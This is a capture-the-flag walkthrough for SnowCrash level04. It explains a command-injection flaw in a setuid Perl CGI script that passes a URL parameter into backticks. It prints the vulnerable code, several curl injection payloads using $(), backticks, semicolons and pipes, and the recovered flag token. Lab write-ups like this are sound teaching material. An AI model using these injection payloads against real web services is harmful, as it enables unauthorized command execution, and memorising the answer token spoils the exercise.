# Level04 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a Perl CGI script with command injection vulnerability to retrieve the flag04 token.

## Vulnerability
Command injection in Perl backticks with unsanitized user input.

## Exploitation

The `level04.pl` Perl CGI script runs with setuid flag04 privileges and executes user input in backticks:

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;  # User input directly in backticks - NO VALIDATION
}
x(param("x"));
```

**The Problem:**
- Backticks execute in shell context
- Shell interprets metacharacters: `$()`, `;`, `|`, etc.
- User input from URL parameter `x` is not validated or escaped
- Binary runs with flag04 privileges (setuid)

### Exploit Steps

#### Step 1: Connect to level04 and Test
```bash
sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level04@localhost id
```

#### Step 2: Execute Command Injection via HTTP
The CGI script listens on port 4747 and accepts URL parameters:

```bash
curl -s "http://localhost:4747/?x=\$(getflag)"
```

**URL Parameter Breakdown:**
- `?x=` - CGI parameter name
- `$(getflag)` - Command substitution syntax (POSIX shell)
- This gets inserted into backticks: `` `echo $(getflag) 2>&1` ``
- Shell expands `$(getflag)` and passes result to echo

#### Step 3: Alternative Injection Methods

- **Using backticks instead of $():**
  ```bash
  curl "http://localhost:4747/?x=\`getflag\`"
  ```

- **Using semicolon to chain commands:**
  ```bash
  curl "http://localhost:4747/?x=test%3Bgetflag"
  ```

- **Using pipe operator:**
  ```bash
  curl "http://localhost:4747/?x=test%7Cgetflag"
  ```

#### Step 4: Extract Token from Response
The response contains the token:
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Security Flaws

1. **No input validation**: User input directly used in shell execution
2. **Unsafe backticks**: Backticks invoke shell with full metacharacter support
3. **Setuid amplification**: Binary runs with flag04 privileges
4. **No escaping**: Input not escaped or quoted
5. **Unsafe API**: Should use `system("cmd", @args)` array form instead of shell string interpolation

## Answer

- **Level04 Token**: `ne2searoevaevoem4ov4ar8ap`
- **Vulnerability Type**: OS command injection via Perl backticks
- **Impact**: Arbitrary code execution with flag04 privileges
